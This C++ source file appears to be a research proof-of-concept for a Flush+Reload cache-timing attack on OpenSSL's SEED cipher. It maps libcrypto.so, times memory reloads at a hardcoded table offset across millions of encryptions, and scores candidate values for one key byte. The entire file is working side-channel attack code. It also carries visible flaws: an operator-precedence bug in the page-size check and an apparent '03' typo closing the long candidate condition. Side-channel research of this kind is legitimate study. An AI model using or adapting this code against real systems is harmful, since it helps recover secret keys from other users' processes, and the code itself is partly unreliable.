#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include <map>
#include <vector>
#include <ctype.h>
#include <termios.h>
#include <sys/stat.h>
#include <sys/types.h>
# include <string.h>
# ifdef _WIN32
#  include <memory.h>
# endif
#include <openssl/seed.h>

#define NUMBER_OF_ENCRYPTIONS (6000000)

const unsigned char userKey[16]={0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15} ;

double Diff_ratio[16][256];
double Diff_ratio1[16][256];
double Diff_ratio2[16][256];
size_t scount;
char* base;
char* end;
char* probe;
int lastRoundKeyGuess[16];
int lastRoundKeyGuess1[16];
int lastRoundKeyGuess2[16];

int main()
{
  int fd = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };

  unsigned char ciphertext[16];

int H0_hit[16][256] ;
int H0_miss[16][256] ;
int H0_total[16][256] ;
int H1_hit[16][256] ;
int H1_miss[16][256] ;
int H1_total[16][256] ;

for (size_t i = 0; i < 16; ++i){
for (size_t j= 0; j < 256; ++j){

 H0_hit[i][j] = 0 ;
 H0_miss[i][j] = 0 ;
 H0_total[i][j] = 0 ;
 H1_hit[i][j] = 0 ;
 H1_miss[i][j] = 0 ;
 H1_total[i][j] = 0;

}
}

unsigned char key_guess[1];
int max[1];
int T[4];

T[0]=0x205dc0  ;

  SEED_KEY_SCHEDULE kd;

  SEED_set_key(userKey,&kd);

  uint64_t min_time = rdtsc();

  srand(min_time);

  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i){
  
  flush(base+T[0]);

  for (size_t j = 0; j < 16; ++j)

    plaintext[j] = rand() % 256;

     SEED_encrypt(plaintext,ciphertext, &kd);

    size_t time = rdtsc();

    maccess(base+T[0]);

    size_t delta = rdtsc() - time;

    if (delta <  220) {

    for (size_t key_candidate = 0; key_candidate < 256; ++key_candidate)
  {

 if ((plaintext[0]^plaintext[4]^key_candidate) == (0)||(plaintext[0]^plaintext[4]^key_candidate) == (1)||(plaintext[0]^plaintext[4]^key_candidate) == (2)||(plaintext[0]^plaintext[4]^key_candidate) == (3)||(plaintext[0]^plaintext[4]^key_candidate) == (4)||(plaintext[0]^plaintext[4]^key_candidate) == (5)||(plaintext[0]^plaintext[4]^key_candidate) == (6)||(plaintext[0]^plaintext[4]^key_candidate) == (7)||(plaintext[0]^plaintext[4]^key_candidate) == (8)||(plaintext[0]^plaintext[4]^key_candidate) == (9)||(plaintext[0]^plaintext[4]^key_candidate) == (10)||(plaintext[0]^plaintext[4]^key_candidate) == (11)||(plaintext[0]^plaintext[4]^key_candidate) == (12)||(plaintext[0]^plaintext[4]^key_candidate) == (13)||(plaintext[0]^plaintext[4]^key_candidate) == (14)||(plaintext[0]^plaintext[4]^key_candidate) == (15)||(plaintext[0]^plaintext[4]^key_candidate) == (16)||(plaintext[0]^plaintext[4]^key_candidate) == (17)||(plaintext[0]^plaintext[4]^key_candidate) == (18)||(plaintext[0]^plaintext[4]^key_candidate) == (19)||(plaintext[0]^plaintext[4]^key_candidate) == (20)||(plaintext[0]^plaintext[4]^key_candidate) == (21)||(plaintext[0]^plaintext[4]^key_candidate) == (22)||(plaintext[0]^plaintext[4]^key_candidate) == (23)||(plaintext[0]^plaintext[4]^key_candidate) == (24)||(plaintext[0]^plaintext[4]^key_candidate) == (25)||(plaintext[0]^plaintext[4]^key_candidate) == (26)||(plaintext[0]^plaintext[4]^key_candidate) == (27)||(plaintext[0]^plaintext[4]^key_candidate) == (28)||(plaintext[0]^plaintext[4]^key_candidate) == (29)||(plaintext[0]^plaintext[4]^key_candidate) == (30)||(plaintext[0]^plaintext[4]^key_candidate) == (31)||(plaintext[0]^plaintext[4]^key_candidate) == (32)||(plaintext[0]^plaintext[4]^key_candidate) == (33)||(plaintext[0]^plaintext[4]^key_candidate) == (34)||(plaintext[0]^plaintext[4]^key_candidate) == (35)||(plaintext[0]^plaintext[4]^key_candidate) == (36)||(plaintext[0]^plaintext[4]^key_candidate) == (37)||(plaintext[0]^plaintext[4]^key_candidate) == (38)||(plaintext[0]^plaintext[4]^key_candidate) == (39)||(plaintext[0]^plaintext[4]^key_candidate) == (40)||(plaintext[0]^plaintext[4]^key_candidate) == (41)||(plaintext[0]^plaintext[4]^key_candidate) == (42)||(plaintext[0]^plaintext[4]^key_candidate) == (43)||(plaintext[0]^plaintext[4]^key_candidate) == (44)||(plaintext[0]^plaintext[4]^key_candidate) == (45)||(plaintext[0]^plaintext[4]^key_candidate) == (46)||(plaintext[0]^plaintext[4]^key_candidate) == (47)||(plaintext[0]^plaintext[4]^key_candidate) == (48)||(plaintext[0]^plaintext[4]^key_candidate) == (49)||(plaintext[0]^plaintext[4]^key_candidate) == (50)||(plaintext[0]^plaintext[4]^key_candidate) == (51)||(plaintext[0]^plaintext[4]^key_candidate) == (52)||(plaintext[0]^plaintext[4]^key_candidate) == (53)||(plaintext[0]^plaintext[4]^key_candidate) == (54)||(plaintext[0]^plaintext[4]^key_candidate) == (55)||(plaintext[0]^plaintext[4]^key_candidate) == (56)||(plaintext[0]^plaintext[4]^key_candidate) == (57)||(plaintext[0]^plaintext[4]^key_candidate) == (58)||(plaintext[0]^plaintext[4]^key_candidate) == (59)||(plaintext[0]^plaintext[4]^key_candidate) == (60)||(plaintext[0]^plaintext[4]^key_candidate) == (61)||(plaintext[0]^plaintext[4]^key_candidate) == (62)||(plaintext[0]^plaintext[4]^key_candidate) == (03)  )

{

            H0_hit[0][key_candidate]++;
            H0_total[0][key_candidate]++;

          }

          else{

            H1_hit[0][key_candidate]++;
            H1_total[0][key_candidate]++;

          }
        }
}

 if (delta > 220){

for (size_t key_candidate = 0; key_candidate < 256; ++key_candidate)

  {

 if ((plaintext[0]^plaintext[4]^key_candidate) == (0)||(plaintext[0]^plaintext[4]^key_candidate) == (1)||(plaintext[0]^plaintext[4]^key_candidate) == (2)||(plaintext[0]^plaintext[4]^key_candidate) == (3)||(plaintext[0]^plaintext[4]^key_candidate) == (4)||(plaintext[0]^plaintext[4]^key_candidate) == (5)||(plaintext[0]^plaintext[4]^key_candidate) == (6)||(plaintext[0]^plaintext[4]^key_candidate) == (7)||(plaintext[0]^plaintext[4]^key_candidate) == (8)||(plaintext[0]^plaintext[4]^key_candidate) == (9)||(plaintext[0]^plaintext[4]^key_candidate) == (10)||(plaintext[0]^plaintext[4]^key_candidate) == (11)||(plaintext[0]^plaintext[4]^key_candidate) == (12)||(plaintext[0]^plaintext[4]^key_candidate) == (13)||(plaintext[0]^plaintext[4]^key_candidate) == (14)||(plaintext[0]^plaintext[4]^key_candidate) == (15)||(plaintext[0]^plaintext[4]^key_candidate) == (16)||(plaintext[0]^plaintext[4]^key_candidate) == (17)||(plaintext[0]^plaintext[4]^key_candidate) == (18)||(plaintext[0]^plaintext[4]^key_candidate) == (19)||(plaintext[0]^plaintext[4]^key_candidate) == (20)||(plaintext[0]^plaintext[4]^key_candidate) == (21)||(plaintext[0]^plaintext[4]^key_candidate) == (22)||(plaintext[0]^plaintext[4]^key_candidate) == (23)||(plaintext[0]^plaintext[4]^key_candidate) == (24)||(plaintext[0]^plaintext[4]^key_candidate) == (25)||(plaintext[0]^plaintext[4]^key_candidate) == (26)||(plaintext[0]^plaintext[4]^key_candidate) == (27)||(plaintext[0]^plaintext[4]^key_candidate) == (28)||(plaintext[0]^plaintext[4]^key_candidate) == (29)||(plaintext[0]^plaintext[4]^key_candidate) == (30)||(plaintext[0]^plaintext[4]^key_candidate) == (31)||(plaintext[0]^plaintext[4]^key_candidate) == (32)||(plaintext[0]^plaintext[4]^key_candidate) == (33)||(plaintext[0]^plaintext[4]^key_candidate) == (34)||(plaintext[0]^plaintext[4]^key_candidate) == (35)||(plaintext[0]^plaintext[4]^key_candidate) == (36)||(plaintext[0]^plaintext[4]^key_candidate) == (37)||(plaintext[0]^plaintext[4]^key_candidate) == (38)||(plaintext[0]^plaintext[4]^key_candidate) == (39)||(plaintext[0]^plaintext[4]^key_candidate) == (40)||(plaintext[0]^plaintext[4]^key_candidate) == (41)||(plaintext[0]^plaintext[4]^key_candidate) == (42)||(plaintext[0]^plaintext[4]^key_candidate) == (43)||(plaintext[0]^plaintext[4]^key_candidate) == (44)||(plaintext[0]^plaintext[4]^key_candidate) == (45)||(plaintext[0]^plaintext[4]^key_candidate) == (46)||(plaintext[0]^plaintext[4]^key_candidate) == (47)||(plaintext[0]^plaintext[4]^key_candidate) == (48)||(plaintext[0]^plaintext[4]^key_candidate) == (49)||(plaintext[0]^plaintext[4]^key_candidate) == (50)||(plaintext[0]^plaintext[4]^key_candidate) == (51)||(plaintext[0]^plaintext[4]^key_candidate) == (52)||(plaintext[0]^plaintext[4]^key_candidate) == (53)||(plaintext[0]^plaintext[4]^key_candidate) == (54)||(plaintext[0]^plaintext[4]^key_candidate) == (55)||(plaintext[0]^plaintext[4]^key_candidate) == (56)||(plaintext[0]^plaintext[4]^key_candidate) == (57)||(plaintext[0]^plaintext[4]^key_candidate) == (58)||(plaintext[0]^plaintext[4]^key_candidate) == (59)||(plaintext[0]^plaintext[4]^key_candidate) == (60)||(plaintext[0]^plaintext[4]^key_candidate) == (61)||(plaintext[0]^plaintext[4]^key_candidate) == (62)||(plaintext[0]^plaintext[4]^key_candidate) == (03)  )        

 {

            H0_miss[0][key_candidate]++;
            H0_total[0][key_candidate]++;

          }

          else{

            H1_miss[0][key_candidate]++;
            H1_total[0][key_candidate]++;

}
}
}
}
    
    for (int byte=0; byte<256; byte++) {

Diff_ratio[0][byte] = ( double) H1_miss[0][byte] - ( double) H0_miss[0][byte] ;

printf("%f,",Diff_ratio[0][byte]);

}

printf("\n");
 
    for (int byte=0; byte<256; byte++) {

Diff_ratio2[0][byte] = ( double) H1_miss[0][byte]/(double) H1_total[0][byte]-( double) H0_miss[0][byte]/(double) H0_total[0][byte] ;

printf("%f,",Diff_ratio2[0][byte]);

}
  printf("\n");
 
    for (int byte=0; byte<256; byte++) {

Diff_ratio1[0][byte] = (( double) H1_miss[0][byte]-((( double) H1_miss[0][byte]/(double) H1_total[0][byte])*(( double) H1_miss[0][byte]/(double) H1_total[0][byte])))/H1_total[0][byte]-(( double) H0_miss[0][byte]-((( double) H0_miss[0][byte]/(double) H0_total[0][byte])*(( double) H0_miss[0][byte]/(double) H0_total[0][byte])))/H0_total[0][byte] ;

printf("%f,",Diff_ratio1[0][byte]);


}

close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

